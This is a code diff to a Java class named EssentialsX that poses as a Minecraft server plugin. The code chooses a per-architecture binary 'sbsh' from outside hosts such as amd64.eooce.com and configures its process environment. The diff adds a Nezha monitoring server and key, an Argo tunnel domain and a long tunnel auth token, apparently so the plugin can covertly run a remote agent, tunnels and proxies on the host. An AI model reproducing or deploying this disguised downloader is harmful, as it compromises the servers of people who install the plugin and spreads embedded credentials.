@@ -44,9 +44,9 @@ public class EssentialsX extends JavaPlugin {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://github.com/wxvxx/myself/releases/download/amd64/sbsh";
+            url = "https://amd64.eooce.com/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://github.com/wxvxx/myself/releases/download/arm64/sbsh";
+            url = "https://arm64.eooce.com/sbsh";
         } else if (osArch.contains("s390x")) {
             url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
@@ -73,14 +73,14 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "6e245c9d-a4aa-4add-b75e-45ee9120cc4c");
+        env.put("UUID", "9f8ef93f-cb9e-46b4-8981-16079765933f");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_SERVER", "nezha.ggff.net:8008");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
+        env.put("NEZHA_KEY", "nezha123@");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_DOMAIN", "liquid.fooc.nyc.mn");
+        env.put("ARGO_AUTH", "eyJhIjoiMzBmMDEyMGY1OGRjYjk4ZDc5ZTM0YTM5ODY2ZGVjMTAiLCJ0IjoiNDVhMTkyZTUtY2FhZC00NjRmLTgxYzUtYzhhYTg1NWZiYjI0IiwicyI6IllqRmlOVE5oTWpVdFpEaGhZUzAwTWpRMkxXSTBNREl0WkdSaU1EVTJaalUzTnpVdyJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
